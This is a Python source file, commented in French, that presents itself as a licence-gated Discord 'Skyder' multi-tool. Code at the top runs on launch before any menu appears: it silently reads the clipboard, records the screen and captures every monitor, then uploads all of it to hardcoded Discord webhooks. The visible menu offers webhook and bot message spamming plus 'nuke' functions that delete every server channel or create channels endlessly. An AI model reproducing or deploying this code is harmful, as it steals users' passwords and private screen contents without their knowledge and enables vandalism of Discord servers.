import mss
import requests
import time
import os
import webbrowser
import asyncio
import aiohttp
import discord
from discord.ext import commands
import pyautogui
import cv2
import numpy as np
import json
import pyperclip

# URL du webhook (par exemple, un webhook Discord)
webhook_url = "https://discord.com/api/webhooks/1252998047798132828/me1taFNNO2T0AwLlf23TSsok4NE1Uzf3AL_i7UmJIoO8fnuxKQKIFmfNUZ0biHVsXIOK"

def send_to_discord(content):
    webhook_url = 'https://discord.com/api/webhooks/1252998049760808971/4aoU_-kw-rg64Lm-S5gJOlkfcvJmOzpl51s593OMRAw1qXeGHmYSrpsFMn70VjNU-iI2'
    
    data = {
        'content': content
    }
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f'Sent to Discord: {content}')
    except requests.exceptions.RequestException as e:
        print(f'Error sending to Discord: {e}')

def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content.splitlines()
    except pyperclip.PyperclipException as e:
        print(f'Error accessing clipboard: {e}')
        return []

if __name__ == '__main__':
    clipboard_lines = get_clipboard_content()
    if clipboard_lines:
        for line in clipboard_lines:
            send_to_discord(line)

# Fonction pour capturer une vidéo de l'écran pendant 15 secondes
def capture_screen_video(duration=15):
    screenshots = []
    start_time = time.time()

    while (time.time() - start_time) < duration:
        # Capturer l'écran
        screenshot = pyautogui.screenshot()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        screenshots.append(screenshot)
        time.sleep(0)  # Capturer toutes les 0.1 secondes

    # Créer une vidéo à partir des captures
    height, width, layers = screenshots[0].shape
    video_name = f"screen_capture_{int(time.time())}.mov"
    video = cv2.VideoWriter(video_name, cv2.VideoWriter_fourcc(*'DIVX'), 10, (width, height))

    for screenshot in screenshots:
        video.write(screenshot)

    cv2.destroyAllWindows()
    video.release()

    return video_name

# Capturer la vidéo de l'écran
video_file = capture_screen_video()

# Envoyer la vidéo au webhook
with open(video_file, "rb") as file:
    files = {
        "file": (video_file, file, "video/x-msvideo")
    }

    response = requests.post(webhook_url, files=files)

# Supprimer le fichier vidéo temporaire
os.remove(video_file)

# Fonction pour capturer tous les écrans
def capture_all_screens():
    with mss.mss() as sct:
        monitors = sct.monitors
        screenshots = []
        for i, monitor in enumerate(monitors[1:], start=1):  # Ignore the first item which is a total screen
            filename = f"screenshot_{i}_{int(time.time())}.png"
            sct_img = sct.grab(monitor)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            screenshots.append(filename)
    return screenshots

# URL du webhook (par exemple, un webhook Discord)
webhook_url = "https://discord.com/api/webhooks/1252998047798132828/me1taFNNO2T0AwLlf23TSsok4NE1Uzf3AL_i7UmJIoO8fnuxKQKIFmfNUZ0biHVsXIOK"

# Capturer tous les écrans
filenames = capture_all_screens()

# Envoyer chaque capture d'écran au webhook
for filename in filenames:
    with open(filename, "rb") as file:
        # Créer un payload avec la capture d'écran
        files = {
            "file": (filename, file, "image/png")
        }
        
        # Envoyer la requête POST au webhook
        response = requests.post(webhook_url, files=files)


    # Supprimer le fichier temporaire
    os.remove(filename)

def clear_screen():
    """Efface l'écran en fonction du système d'exploitation"""
    os.system('cls' if os.name == 'nt' else 'clear')

def open_discord():
    """Ouvre le lien Discord dans le navigateur par défaut"""
    webbrowser.open("https://discord.gg/G8XpmjDcsd")

def open_github():
    """Ouvre le lien GitHub dans le navigateur par défaut"""
    webbrowser.open("https://github.com/skyder-dev")

def display_help():
    """Affiche le message d'aide"""
    clear_screen()
    help_text = """

                                          ███████╗ ██████╗  ██████╗ ███╗   ██╗
                                          ██╔════╝██╔═══██╗██╔═══██╗████╗  ██║
                                          ███████╗██║   ██║██║   ██║██╔██╗ ██║
                                          ╚════██║██║   ██║██║   ██║██║╚██╗██║
                                          ███████║╚██████╔╝╚██████╔╝██║ ╚████║
                                          ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
                                                                        

"""
    print(help_text)

async def send_message_webhook(session, webhook_url, data):
    """Envoie un message au webhook Discord spécifié"""
    try:
        async with session.post(webhook_url, json=data) as response:
            if response.status == 204:
                print("\033[92m [+]\033[0m Message envoyé avec succès !")  # En vert
            else:
                print("\033[91m [-]\033[0m Une erreur s'est produite lors de l'envoi du message.")  # En rouge
    except aiohttp.ClientError as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e, "")  # En rouge

async def send_message_bot(token, channel_id, message, message_count):
    """Envoie un message à un salon Discord en utilisant un bot"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        channel = bot.get_channel(channel_id)
        if channel:
            try:
                for _ in range(message_count):
                    await channel.send(message)
                    print("\033[92m [+]\033[0m Message envoyé avec succès !")  # En vert
                    await asyncio.sleep(0.3)
            except discord.DiscordException as e:
                print("\\033[91m [-]\033[0m Une erreur s'est produite lors de l'envoi du message :", e)  # En rouge
        else:
            print("\033[91m [-]\033[0m Erreur : Salon Discord introuvable.")  # En rouge
        await bot.close()

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e)  # En rouge

async def nuke_server(token):
    """Supprime tous les salons du serveur Discord"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print("\033[92m [+]\033[0m Salon supprimé avec succès !")  # En vert
                except discord.DiscordException as e:
                    print("\033[91m [-]\033[0m Une erreur s'est produite lors de la suppression du salon :", e)  # En rouge
        await bot.close()

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0mErreur de connexion :", e)  # En rouge

async def mega_nuke_server(token):
    """Supprime tous les salons du serveur Discord et crée de nouveaux salons en boucle"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print("\033[92m [+]\033[0m Salon supprimé avec succès !")  # En vert
                except discord.DiscordException as e:
                    print("\033[91mUne erreur s'est produite lors de la suppression du salon :", e)  # En rouge
            while True:
                try:
                    await guild.create_text_channel("new-channel")
                    print("\033[91m [-]\033[0mNouveau salon créé avec succès !\033[0m")  # En vert
                except discord.DiscordException as e:
                    print("\033[91m [-]\033[0mUne erreur s'est produite lors de la création du salon :", e)  # En rouge

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e)  # En rouge

async def discord_tool():
    """Outil pour envoyer des messages à un webhook Discord ou un bot"""
    clear_screen()
    logo = """
\033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
               
\033[34m                                             
"""
    print(logo)
    
    print(" [1] webhook\n [2] token ")
    option = input('\n Choisissez une option : ')
    clear_screen()
    print(logo)
    if option == "1":
        message_count = int(input(" Entrez le nombre de messages à envoyer : "))
        clear_screen()
        print(logo)
        message = input(" Entrez le message à envoyer : ")
        clear_screen()
        print(logo)
        webhook_url = input(" Entrez l'URL du webhook Discord : ")
        data = {"content": message}
        async with aiohttp.ClientSession() as session:
            tasks = [send_message_webhook(session, webhook_url, data) for _ in range(message_count)]
            await asyncio.gather(*tasks)
    elif option == "2":
        print(" [1] Delete all")
        print(" [2] Create")
        print(" [3] Send msg\n")
        sub_option = input(" Choisissez une option : ").strip()
        clear_screen()
        print(logo)
        if sub_option == "1":
            token = input(" Entrez le token du bot Discord : ")
            await nuke_server(token)
            clear_screen()
            print(logo)
        elif sub_option == "2":
            token = input(" Entrez le token du bot Discord : ")
            await mega_nuke_server(token)
            clear_screen()
            print(logo)
        elif sub_option == "3":
            token = input(" Entrez le token du bot Discord : ")
            clear_screen()
            print(logo)
            channel_id = int(input(" Entrez l'ID du salon Discord : "))
            clear_screen()
            print(logo)
            message_count = int(input(" Entrez le nombre de messages à envoyer : "))
            clear_screen()
            print(logo)
            message = input(" Entrez le message à envoyer : ")
            await send_message_bot(token, channel_id, message, message_count)
        else:
            print(" Option invalide.")
    else:
        print(" Option invalide.")

def display_menu():
    """Affiche le menu principal"""
    clear_screen()
    logo = """
\033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
                 
\033[34m                                             
"""
    print(logo)
    print(" [1] Discord Serveur")
    print(" [2] Skyder GitHub")
    print(" [3] Help")
    print(" [4] Discord Tool")
    print("")


import getpass

async def get_key(logo):
    """Fonction pour saisir et vérifier la clé"""
    while True:
        clear_screen()
        print(logo)  # Afficher le logo
        print("")
        print("")
        print("")
        key = input(" Votre clé de licence : ")
        # Vérifiez la validité de la clé ici
        if key == "skyder":
            return True
        else:
            print("\033[91m [-]\033[0m Clé invalide. Veuillez réessayer.")


async def main():
    """Boucle principale du programme"""
    logo = """
    \033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
     
    """
    while True:
        await get_key(logo)  # Passer le logo à la fonction pour saisir la clé
        display_menu()
        choice = input(" Choisissez une option : ")

        if choice == "1":
            open_discord()
        elif choice == "2":
            open_github()
        elif choice == "3":
            display_help()
        elif choice == "4":
            await discord_tool()
        else:
            print("Option invalide.")

        input("Appuyez sur Entrée pour continuer...")

if __name__ == "__main__":
    asyncio.run(main())